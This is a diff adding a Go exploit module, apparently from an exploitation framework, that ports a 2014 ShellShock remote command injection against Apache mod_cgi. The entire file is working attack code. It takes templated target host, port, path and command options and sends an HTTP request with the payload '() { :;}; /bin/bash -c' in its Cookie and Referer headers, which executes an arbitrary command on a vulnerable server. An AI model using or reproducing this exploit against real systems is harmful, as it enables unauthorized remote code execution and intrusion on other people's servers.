@@ -1,0 +1,38 @@
+/*{
+Name: ShellShock Remote Command Injection
+Author: Federico Galatolo
+Ported By: TerminalJockey
+Date: 2014-10-06
+Description: Apache mod_cgi 'ShellShock' Remote Command Injection
+Type:Web
+Options:
+{
+	"Rhost":"",
+	"Rport":"",
+	"Dir":"",
+	"Cmd":""
+}
+}*/
+
+
+package main
+
+import (
+	"fmt"
+	"log"
+	"net/http"
+)
+
+func main() {
+	client := &http.Client{}
+	req, _ := http.NewRequest("GET", "http://{{.Rhost}}:{{.Rport}}/{{.Dir}}", nil)
+	pload := `() { :;}; /bin/bash -c {{.Cmd}} &`
+	req.Header.Set("Cookie", pload)
+	req.Header.Set("Referer", pload)
+	fmt.Println(req)
+	_, err := client.Do(req)
+	if err != nil {
+		log.Println(err)
+	}
+
+}
